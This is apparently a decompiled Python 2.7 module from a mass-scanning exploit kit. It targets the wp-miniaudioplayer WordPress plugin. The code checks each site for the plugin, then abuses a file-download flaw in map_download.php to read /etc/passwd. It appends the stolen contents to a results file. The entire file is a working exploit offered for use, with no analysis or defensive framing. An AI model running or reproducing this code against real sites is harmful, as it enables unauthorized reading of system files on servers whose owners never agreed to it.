# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\wp_miniaudioplayer.py
import requests
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def Exploit(site):
    try:
        CheckVuln = requests.get('http://' + site, timeout=10, headers=Headers)
        if 'wp-miniaudioplayer' in CheckVuln.content:
            etc = requests.get('http://' + site + '/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/etc/passwd', timeout=5, headers=Headers)
            if 'nologin' in etc.content:
                with open('result/Passwd_file.content', 'a') as writer:
                    writer.write('---------------------------\nSite: ' + site + '\n' + etc.content + '\n')
                return printModule.returnYes(site, 'N/A', 'wp-miniaudioplayer', 'Wordpress')
            else:
                return printModule.returnNo(site, 'N/A', 'wp-miniaudioplayer', 'Wordpress')

        else:
            return printModule.returnNo(site, 'N/A', 'wp-miniaudioplayer', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'wp-miniaudioplayer', 'Wordpress')